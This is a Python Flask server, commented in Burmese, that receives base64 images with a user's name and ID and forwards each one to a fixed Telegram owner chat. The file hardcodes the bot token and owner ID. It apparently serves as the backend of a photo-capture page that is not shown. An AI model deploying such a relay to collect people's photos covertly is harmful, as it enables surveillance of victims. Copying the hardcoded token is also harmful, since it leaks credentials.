import os
import json
import base64
from flask import Flask, request, jsonify
from telegram import Bot
import asyncio

app = Flask(__name__)

# --- လိုအပ်သော အချက်အလက်များ ---
TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
OWNER_ID = '7812553563' # ဥပမာ- 12345678
bot = Bot(token=TOKEN)

@app.route('/')
def index():
    return open('index.html', 'r', encoding='utf-8').read()

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    image_data = data.get('image').split(",")[1]
    user_id = data.get('user_id')
    user_name = data.get('user_name')

    # ပုံကို သိမ်းဆည်းခြင်း
    image_path = "capture.jpg"
    with open(image_path, "wb") as f:
        f.write(base64.b64decode(image_data))

    # Bot Owner ဆီသို့ ပုံကို ပို့ခြင်း
    async def send_to_owner():
        async with bot:
            # Owner ဆီသို့ ပုံပို့ခြင်း
            await bot.send_photo(
                chat_id=OWNER_ID,
                photo=open(image_path, 'rb'),
                caption=f"🔔 ပုံအသစ်ရရှိသည်!\n👤 User: {user_name}\n🆔 ID: {user_id}"
            )
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_to_owner())

    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    # Render တွင် run ရန် port သတ်မှတ်ခြင်း
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
